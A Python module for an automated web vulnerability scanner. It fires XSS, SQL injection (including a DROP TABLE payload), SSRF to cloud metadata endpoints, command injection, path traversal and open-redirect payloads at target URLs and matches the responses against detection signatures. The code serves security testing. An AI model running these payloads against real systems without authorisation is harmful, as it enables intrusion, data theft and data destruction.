"""
Vulnerability Scanner Module
Performs comprehensive vulnerability testing including XSS, SQLi, SSRF, RCE, etc.
"""

import asyncio
import aiohttp
import re
import urllib.parse
import json
import random
import string
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

class VulnerabilityModule:
    """Advanced vulnerability scanner with AI-guided testing"""
    
    def __init__(self, config):
        self.config = config
        self.payloads = {}
        self.vulnerability_signatures = {}
        self.load_payloads()
        self.load_signatures()
        
    def load_payloads(self):
        """Load vulnerability testing payloads"""
        self.payloads = {
            'xss': {
                'basic': [
                    '<script>alert("XSS")</script>',
                    '"><script>alert("XSS")</script>',
                    "';alert('XSS');//",
                    '<img src=x onerror=alert("XSS")>',
                    '<svg onload=alert("XSS")>',
                    'javascript:alert("XSS")',
                    '"><svg/onload=alert("XSS")>',
                    '<iframe src=javascript:alert("XSS")></iframe>'
                ],
                'encoded': [
                    '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
                    '&lt;script&gt;alert("XSS")&lt;/script&gt;',
                    '&#60;script&#62;alert("XSS")&#60;/script&#62;'
                ],
                'advanced': [
                    '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
                    '<img src=1 onerror=eval(atob("YWxlcnQoIlhTUyIp"))>',
                    '<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))>'
                ]
            },
            'sqli': {
                'basic': [
                    "' OR 1=1--",
                    '" OR 1=1--',
                    "' OR 'a'='a",
                    '" OR "a"="a',
                    "' UNION SELECT NULL--",
                    "' UNION SELECT 1,2,3--",
                    "'; DROP TABLE users--",
                    "admin'--",
                    "admin'/*"
                ],
                'blind': [
                    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
                    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
                    "' AND (SELECT SLEEP(5))--",
                    "'; WAITFOR DELAY '00:00:05'--"
                ],
                'union': [
                    "' UNION SELECT version()--",
                    "' UNION SELECT database()--",
                    "' UNION SELECT user()--",
                    "' UNION SELECT schema_name FROM information_schema.schemata--"
                ]
            },
            'ssrf': {
                'internal': [
                    'http://localhost/',
                    'http://127.0.0.1/',
                    'http://0.0.0.0/',
                    'http://[::1]/',
                    'http://169.254.169.254/',  # AWS metadata
                    'http://metadata.google.internal/',  # GCP metadata
                    'file:///etc/passwd',
                    'file:///proc/self/environ'
                ],
                'protocols': [
                    'gopher://localhost:3306/',
                    'dict://localhost:11211/',
                    'ldap://localhost:389/',
                    'ftp://localhost/'
                ]
            },
            'rce': {
                'basic': [
                    '; whoami',
                    '| whoami',
                    '`whoami`',
                    '$(whoami)',
                    '; id',
                    '| id',
                    '`id`',
                    '$(id)'
                ],
                'encoded': [
                    '%3B%20whoami',
                    '%7C%20whoami',
                    '%60whoami%60'
                ],
                'advanced': [
                    '; echo "vulnerable" > /tmp/test.txt',
                    '| ping -c 1 127.0.0.1',
                    '; sleep 5',
                    '`sleep 5`'
                ]
            },
            'lfi': {
                'basic': [
                    '../../../etc/passwd',
                    '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                    '/etc/passwd',
                    'C:\\windows\\system32\\drivers\\etc\\hosts',
                    '....//....//....//etc/passwd'
                ],
                'encoded': [
                    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                    '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd'
                ]
            },
            'open_redirect': [
                'http://evil.com',
                '//evil.com',
                '/\\evil.com',
                'https://evil.com',
                'javascript:alert("redirect")',
                'data:text/html,<script>alert("redirect")</script>'
            ],
            'csrf': [
                # CSRF testing typically requires form analysis
                'test_csrf_token_missing',
                'test_csrf_token_bypass'
            ]
        }
    
    def load_signatures(self):
        """Load vulnerability detection signatures"""
        self.vulnerability_signatures = {
            'xss': {
                'indicators': [
                    '<script>alert("XSS")</script>',
                    'alert("XSS")',
                    'onerror=alert',
                    'onload=alert',
                    'javascript:alert'
                ],
                'patterns': [
                    r'<script[^>]*>.*?alert.*?</script>',
                    r'onerror\s*=\s*["\']?alert',
                    r'onload\s*=\s*["\']?alert',
                    r'javascript:\s*alert'
                ]
            },
            'sqli': {
                'error_patterns': [
                    r'SQL syntax.*MySQL',
                    r'Warning.*mysql_.*',
                    r'valid MySQL result',
                    r'MySqlException',
                    r'PostgreSQL.*ERROR',
                    r'Warning.*pg_.*',
                    r'valid PostgreSQL result',
                    r'Npgsql\.',
                    r'Oracle error',
                    r'Oracle.*Driver',
                    r'Warning.*oci_.*',
                    r'Warning.*ora_.*'
                ],
                'indicators': [
                    'mysql_fetch_array',
                    'ORA-01756',
                    'Microsoft OLE DB Provider for ODBC Drivers',
                    'Microsoft Access Driver',
                    'SQLServer JDBC Driver'
                ]
            },
            'ssrf': {
                'indicators': [
                    'connection refused',
                    'connection timed out',
                    'no route to host',
                    'internal server error',
                    'network is unreachable'
                ],
                'success_patterns': [
                    r'<title>.*localhost.*</title>',
                    r'apache.*server.*status',
                    r'nginx.*status'
                ]
            },
            'rce': {
                'indicators': [
                    'uid=',
                    'gid=',
                    'groups=',
                    'root:x:0:0',
                    'bin:x:1:1',
                    'daemon:x:2:2',
                    'command not found',
                    'sh: command not found',
                    'bash: command not found'
                ],
                'patterns': [
                    r'uid=\d+\([^)]+\)',
                    r'gid=\d+\([^)]+\)',
                    r'[a-zA-Z0-9_-]+:x:\d+:\d+'
                ]
            },
            'lfi': {
                'indicators': [
                    'root:x:0:0:root:/root:/bin/',
                    '[boot loader]',
                    'for 16-bit app support',
                    '# /etc/passwd',
                    '# This file controls'
                ],
                'patterns': [
                    r'[a-zA-Z0-9_-]+:x:\d+:\d+:[^:]*:[^:]*:[^:]*',
                    r'\[boot loader\]',
                    r'# /etc/passwd'
                ]
            }
        }
    
    async def scan(self, urls: List[str], parameters: List[Dict[str, Any]], 
                  technologies: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Main vulnerability scanning method"""
        
        vulnerabilities = []
        
        console.print(f"[cyan]ðŸŽ¯ Starting vulnerability scan on {len(urls)} URLs[/cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            console=console
        ) as progress:
            
            # Create scanning tasks
            scan_tasks = []
            
            # XSS scanning
            scan_tasks.append(('XSS', self._scan_xss(urls, parameters)))
            
            # SQL Injection scanning
            scan_tasks.append(('SQLi', self._scan_sqli(urls, parameters)))
            
            # SSRF scanning
            scan_tasks.append(('SSRF', self._scan_ssrf(urls, parameters)))
            
            # RCE scanning
            scan_tasks.append(('RCE', self._scan_rce(urls, parameters)))
            
            # LFI scanning
            scan_tasks.append(('LFI', self._scan_lfi(urls, parameters)))
            
            # Open Redirect scanning
            scan_tasks.append(('Open Redirect', self._scan_open_redirect(urls, parameters)))
            
            # CSRF scanning
            scan_tasks.append(('CSRF', self._scan_csrf(urls)))
            
            # Execute scans
            for scan_name, scan_task in scan_tasks:
                task = progress.add_task(f"Scanning {scan_name}...", total=None)
                
                try:
                    scan_results = await scan_task
                    vulnerabilities.extend(scan_results)
                    
                    progress.update(task, description=f"âœ… {scan_name} - Found {len(scan_results)} issues")
                    
                except Exception as e:
                    progress.update(task, description=f"âŒ {scan_name} - Error: {str(e)[:50]}")
                
                progress.remove_task(task)
        
        # Deduplicate and prioritize vulnerabilities
        vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)
        vulnerabilities = sorted(vulnerabilities, key=lambda x: self._get_severity_score(x['severity']), reverse=True)
        
        console.print(f"[green]âœ… Vulnerability scan completed! Found {len(vulnerabilities)} vulnerabilities[/green]")
        
        return vulnerabilities
    
    async def _scan_xss(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for Cross-Site Scripting vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            # Test reflected XSS in URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    for payload_category in ['basic', 'encoded', 'advanced']:
                        for payload in self.payloads['xss'][payload_category]:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_xss_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break  # Move to next parameter after finding vulnerability
            
            # Test XSS in discovered parameters
            for param_info in parameters:
                if param_info.get('url') == url:
                    for param_name in param_info.get('parameters', []):
                        for payload in self.payloads['xss']['basic']:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_xss_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    async def _test_xss_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual XSS payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    response_text = await response.text()
                    
                    # Check if payload is reflected in response
                    if payload in response_text:
                        # Check for XSS indicators
                        for indicator in self.vulnerability_signatures['xss']['indicators']:
                            if indicator in response_text:
                                return {
                                    'type': 'Cross-Site Scripting (XSS)',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'parameter': parameter,
                                    'payload': payload,
                                    'description': f'Reflected XSS vulnerability found in parameter "{parameter}"',
                                    'evidence': f'Payload "{payload}" was reflected in response',
                                    'impact': 'Attackers can execute malicious scripts in victim browsers',
                                    'recommendation': 'Implement proper input validation and output encoding'
                                }
                    
                    # Check for XSS patterns in response
                    for pattern in self.vulnerability_signatures['xss']['patterns']:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return {
                                'type': 'Cross-Site Scripting (XSS)',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'Potential XSS vulnerability in parameter "{parameter}"',
                                'evidence': f'XSS pattern detected in response',
                                'impact': 'Possible script execution vulnerability',
                                'recommendation': 'Review input validation and output encoding'
                            }
        
        except Exception:
            pass
        
        return None
    
    async def _scan_sqli(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for SQL Injection vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            # Test SQL injection in URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    for payload_category in ['basic', 'blind', 'union']:
                        for payload in self.payloads['sqli'][payload_category]:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_sqli_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
            
            # Test SQL injection in discovered parameters
            for param_info in parameters:
                if param_info.get('url') == url:
                    for param_name in param_info.get('parameters', []):
                        for payload in self.payloads['sqli']['basic']:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_sqli_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    async def _test_sqli_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual SQL injection payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    response_text = await response.text()
                    
                    # Check for SQL error patterns
                    for pattern in self.vulnerability_signatures['sqli']['error_patterns']:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return {
                                'type': 'SQL Injection',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'SQL injection vulnerability found in parameter "{parameter}"',
                                'evidence': f'SQL error detected in response',
                                'impact': 'Database compromise, data theft, server takeover',
                                'recommendation': 'Use parameterized queries and input validation'
                            }
                    
                    # Check for SQL injection indicators
                    for indicator in self.vulnerability_signatures['sqli']['indicators']:
                        if indicator in response_text:
                            return {
                                'type': 'SQL Injection',
                                'severity': 'HIGH',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'Potential SQL injection in parameter "{parameter}"',
                                'evidence': f'SQL indicator found: {indicator}',
                                'impact': 'Possible database access vulnerability',
                                'recommendation': 'Implement proper input validation'
                            }
        
        except Exception:
            pass
        
        return None
    
    async def _scan_ssrf(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for Server-Side Request Forgery vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            # Test SSRF in URL parameters that might accept URLs
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    # Look for URL-like parameters
                    if any(keyword in param_name.lower() for keyword in ['url', 'link', 'redirect', 'callback', 'src']):
                        for payload_category in ['internal', 'protocols']:
                            for payload in self.payloads['ssrf'][payload_category]:
                                test_url = self._build_test_url(url, param_name, payload)
                                
                                vuln = await self._test_ssrf_payload(test_url, payload, param_name)
                                if vuln:
                                    vulnerabilities.append(vuln)
                                    break
        
        return vulnerabilities
    
    async def _test_ssrf_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual SSRF payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=20)) as response:
                    response_text = await response.text()
                    
                    # Check for SSRF success indicators
                    for pattern in self.vulnerability_signatures['ssrf']['success_patterns']:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            return {
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'SSRF vulnerability found in parameter "{parameter}"',
                                'evidence': f'Internal service response detected',
                                'impact': 'Access to internal services, cloud metadata, port scanning',
                                'recommendation': 'Implement URL validation and network segmentation'
                            }
                    
                    # Check for SSRF indicators (errors that suggest internal requests)
                    for indicator in self.vulnerability_signatures['ssrf']['indicators']:
                        if indicator.lower() in response_text.lower():
                            return {
                                'type': 'Server-Side Request Forgery (SSRF)',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'Potential SSRF in parameter "{parameter}"',
                                'evidence': f'Network error suggests internal request: {indicator}',
                                'impact': 'Possible internal network access',
                                'recommendation': 'Review URL handling and implement validation'
                            }
        
        except asyncio.TimeoutError:
            # Timeout might indicate successful internal request
            return {
                'type': 'Server-Side Request Forgery (SSRF)',
                'severity': 'MEDIUM',
                'url': test_url,
                'parameter': parameter,
                'payload': payload,
                'description': f'Potential SSRF timeout in parameter "{parameter}"',
                'evidence': f'Request timeout suggests internal network access',
                'impact': 'Possible internal service interaction',
                'recommendation': 'Investigate timeout behavior and implement URL validation'
            }
        except Exception:
            pass
        
        return None
    
    async def _scan_rce(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for Remote Code Execution vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            # Test RCE in URL parameters
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    for payload_category in ['basic', 'encoded', 'advanced']:
                        for payload in self.payloads['rce'][payload_category]:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_rce_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    async def _test_rce_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual RCE payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    response_text = await response.text()
                    
                    # Check for RCE indicators
                    for indicator in self.vulnerability_signatures['rce']['indicators']:
                        if indicator in response_text:
                            return {
                                'type': 'Remote Code Execution (RCE)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'RCE vulnerability found in parameter "{parameter}"',
                                'evidence': f'Command execution output detected: {indicator}',
                                'impact': 'Complete server compromise, data theft, malware installation',
                                'recommendation': 'Eliminate command execution or implement strict validation'
                            }
                    
                    # Check for RCE patterns
                    for pattern in self.vulnerability_signatures['rce']['patterns']:
                        if re.search(pattern, response_text):
                            return {
                                'type': 'Remote Code Execution (RCE)',
                                'severity': 'CRITICAL',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'RCE vulnerability found in parameter "{parameter}"',
                                'evidence': f'System information leaked in response',
                                'impact': 'Server compromise and data access',
                                'recommendation': 'Remove command execution functionality'
                            }
        
        except Exception:
            pass
        
        return None
    
    async def _scan_lfi(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for Local File Inclusion vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            # Test LFI in URL parameters that might include files
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    # Look for file-related parameters
                    if any(keyword in param_name.lower() for keyword in ['file', 'page', 'include', 'template', 'doc']):
                        for payload_category in ['basic', 'encoded']:
                            for payload in self.payloads['lfi'][payload_category]:
                                test_url = self._build_test_url(url, param_name, payload)
                                
                                vuln = await self._test_lfi_payload(test_url, payload, param_name)
                                if vuln:
                                    vulnerabilities.append(vuln)
                                    break
        
        return vulnerabilities
    
    async def _test_lfi_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual LFI payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                    response_text = await response.text()
                    
                    # Check for LFI indicators
                    for indicator in self.vulnerability_signatures['lfi']['indicators']:
                        if indicator in response_text:
                            return {
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'LFI vulnerability found in parameter "{parameter}"',
                                'evidence': f'System file content detected',
                                'impact': 'Access to sensitive files, configuration disclosure',
                                'recommendation': 'Implement file path validation and restrictions'
                            }
                    
                    # Check for LFI patterns
                    for pattern in self.vulnerability_signatures['lfi']['patterns']:
                        if re.search(pattern, response_text):
                            return {
                                'type': 'Local File Inclusion (LFI)',
                                'severity': 'HIGH',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'LFI vulnerability found in parameter "{parameter}"',
                                'evidence': f'File system structure exposed',
                                'impact': 'File system access and information disclosure',
                                'recommendation': 'Restrict file access and validate inputs'
                            }
        
        except Exception:
            pass
        
        return None
    
    async def _scan_open_redirect(self, urls: List[str], parameters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Scan for Open Redirect vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            parsed_url = urlparse(url)
            if parsed_url.query:
                query_params = parse_qs(parsed_url.query)
                
                for param_name, param_values in query_params.items():
                    # Look for redirect-related parameters
                    if any(keyword in param_name.lower() for keyword in ['redirect', 'url', 'next', 'return', 'goto']):
                        for payload in self.payloads['open_redirect']:
                            test_url = self._build_test_url(url, param_name, payload)
                            
                            vuln = await self._test_open_redirect_payload(test_url, payload, param_name)
                            if vuln:
                                vulnerabilities.append(vuln)
                                break
        
        return vulnerabilities
    
    async def _test_open_redirect_payload(self, test_url: str, payload: str, parameter: str) -> Optional[Dict[str, Any]]:
        """Test individual Open Redirect payload"""
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, allow_redirects=False, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    
                    # Check for redirect responses
                    if response.status in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        
                        # Check if redirect goes to our payload URL
                        if payload in location or (payload.startswith('//') and payload[2:] in location):
                            return {
                                'type': 'Open Redirect',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': parameter,
                                'payload': payload,
                                'description': f'Open redirect vulnerability in parameter "{parameter}"',
                                'evidence': f'Redirects to: {location}',
                                'impact': 'Phishing attacks, credential theft',
                                'recommendation': 'Validate redirect URLs against whitelist'
                            }
        
        except Exception:
            pass
        
        return None
    
    async def _scan_csrf(self, urls: List[str]) -> List[Dict[str, Any]]:
        """Scan for CSRF vulnerabilities"""
        
        vulnerabilities = []
        
        for url in urls:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as response:
                        response_text = await response.text()
                        
                        # Look for forms
                        import re
                        forms = re.findall(r'<form[^>]*>(.*?)</form>', response_text, re.DOTALL | re.IGNORECASE)
                        
                        for form in forms:
                            # Check if form has CSRF protection
                            has_csrf_token = bool(re.search(r'csrf|token|authenticity', form, re.IGNORECASE))
                            
                            # Check for state-changing methods
                            method_match = re.search(r'method\s*=\s*["\']?(post|put|delete|patch)["\']?', form, re.IGNORECASE)
                            
                            if method_match and not has_csrf_token:
                                vulnerabilities.append({
                                    'type': 'Cross-Site Request Forgery (CSRF)',
                                    'severity': 'MEDIUM',
                                    'url': url,
                                    'parameter': 'form',
                                    'payload': 'N/A',
                                    'description': 'Form lacks CSRF protection',
                                    'evidence': f'Form with {method_match.group(1).upper()} method has no CSRF token',
                                    'impact': 'Unauthorized actions on behalf of users',
                                    'recommendation': 'Implement CSRF tokens for all state-changing forms'
                                })
            
            except Exception:
                continue
        
        return vulnerabilities
    
    def _build_test_url(self, base_url: str, param_name: str, payload: str) -> str:
        """Build test URL with payload"""
        
        parsed = urlparse(base_url)
        query_params = parse_qs(parsed.query)
        
        # Add or modify the parameter with payload
        query_params[param_name] = [payload]
        
        # Rebuild URL
        new_query = urlencode(query_params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
    
    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Remove duplicate vulnerabilities"""
        
        seen = set()
        unique_vulns = []
        
        for vuln in vulnerabilities:
            # Create a key for deduplication
            key = (vuln['type'], vuln['url'], vuln.get('parameter', ''))
            
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)
        
        return unique_vulns
    
    def _get_severity_score(self, severity: str) -> int:
        """Get numeric score for severity"""
        scores = {
            'CRITICAL': 4,
            'HIGH': 3,
            'MEDIUM': 2,
            'LOW': 1,
            'INFO': 0
        }
        return scores.get(severity.upper(), 0)
